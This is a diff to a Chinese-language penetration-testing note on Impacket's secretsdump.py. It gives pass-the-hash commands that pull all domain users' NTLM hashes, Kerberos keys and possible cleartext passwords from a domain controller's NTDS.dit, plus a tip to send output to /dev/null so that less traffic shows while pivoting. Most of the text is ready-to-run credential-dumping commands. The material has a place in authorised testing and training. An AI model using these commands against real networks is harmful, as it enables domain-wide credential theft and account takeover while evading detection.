@@ -108,12 +108,16 @@ connection:
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH 
 ```
-secretsdump.py主要从SAM、LSA secrets(包括 cached creds)和域控的NTDS.dit三处获取用户凭证，唯一的一点是不能dump LSASS进程在内存中的数据。  
-导出域控所有用户hash  
+secretsdump.py主要从SAM、LSA secrets(包括 cached creds)和域控的NTDS.dit(包括Supplemental Credentials，可能有明文密码)三处获取用户凭证，唯一的一点是不能dump LSASS进程在内存中的数据。  
+1、导出域内所有用户ntlm hash(通过预控上的ntds.dit数据库获取)  
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp
 ```
-secretsdump.py会把结果打印到标注输出，而渗透过程中可能经过多个跳板机，这样可能产生额外流量，为了避免这种情况，可以把输出定向到/dev/null。  
+2、导出域内所有用户的ntlm hash、Kerberos keys和Domain Credentials(Supplemental Credentials，可能保存有明文密码，secretsdump生成的文件以cleartext为后缀)。  
+```
+python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc -outputfile tmp
+```
+3、secretsdump.py会把结果打印到标准输出，而渗透过程中可能会经过多个跳板机在内网运行secretsdump，这样可能产生额外流量，为了避免这种情况，可以把输出定向到/dev/null。  
 ```
 python secretsdump.py domain/username@10.10.10.10 -hashes LM HASH:NT HASH  -just-dc-ntlm -outputfile tmp >/dev/null
 ```
